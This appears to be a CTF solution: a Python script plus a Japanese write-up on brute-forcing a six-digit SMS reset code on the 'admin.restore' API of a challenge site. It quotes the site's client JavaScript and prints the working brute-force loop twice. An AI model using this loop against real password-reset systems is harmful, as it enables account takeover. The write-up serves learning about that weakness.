import hhtools.util as hu
import re
import json

js = json.loads(hu.get_file_via_internet_post_form_nocache("http://sherlock-message.ru/api/admin.restore", {}))
ha = js['response']['new_hash']
print(f'has: {ha}')

for code in range(260000, 280000):
    js = json.loads(hu.get_file_via_internet_post_form_nocache('http://sherlock-message.ru/api/admin.restore', {
            'hash': ha, 
            'sms_code': str(code)}))
    
    print(str(code) + ':' + str(js))

    if js['response']['need_sms'] == False:
        print('Got it!')
        break
    ha = js['response']['new_hash']
'''
# 前提知識

- ブルートフォース攻撃

# 解説

Hintを見るとかなり難易度が下がる。
パスワードの再発行でSMS認証を使っていて、いかにも特殊な感じがする。
http://sherlock-message.ru/script.js
コードで該当の場所を見てみると、以下のようになっている。

```javascript
case 'adminRestore':
    req = api('admin.restore', undefined, true);
    if (req.status === 'success') {
        while (req.response.need_sms === true) {
            code = prompt('A six-digit secret code has been sent to your number. Enter the code from SMS:');
            if (code === null || code === undefined || code === '') {
                location.reload();
            } else {
                req = api('admin.restore', {
                    'hash': req.response.new_hash,
                    'sms_code': code
                }, true);
            }
        }
        if (req.response.message) alert(req.response.message);
    }
    break;
```

コードを見る感じ、whileで何回も聞いている。
再送という言葉もないので、同じコードを無限に要求しているのでは？と想像できる。
コードは全部で10^6通りであるため、まだブルートフォース可能な範囲。
2番目のヒントを見ると、かなり範囲が狭まれる。

```python
import hhtools.util as hu
import json

js = json.loads(hu.get_file_via_internet_post_form_nocache("http://sherlock-message.ru/api/admin.restore", {}))
ha = js['response']['new_hash']
print(f'has: {ha}')

for code in range(260000, 280000):
    js = json.loads(hu.get_file_via_internet_post_form_nocache('http://sherlock-message.ru/api/admin.restore', {
            'hash': ha, 
            'sms_code': str(code)}))
    
    print(str(code) + ':' + str(js))

    if js['response']['need_sms'] == False:
        print('Got it!')
        break
    ha = js['response']['new_hash']
```

以下、復習。
大体こういうのってメールかSMSで送られてくるなーと思って、とりあえずSMS認証でブルートフォース探してみる。
有名なやり方なんかなーと探してみると、[$1657のバグバウンティがでてきた](https://hackerone.com/reports/700612)
[Paper](https://www.researchgate.net/publication/325373867_Cracking_IoT_Device_User_Account_via_Brute-force_Attack_to_SMS_Authentication_Code)もでてきた。
でも全体的に量が少なく、一般的って感じじゃないっぽい。

'''
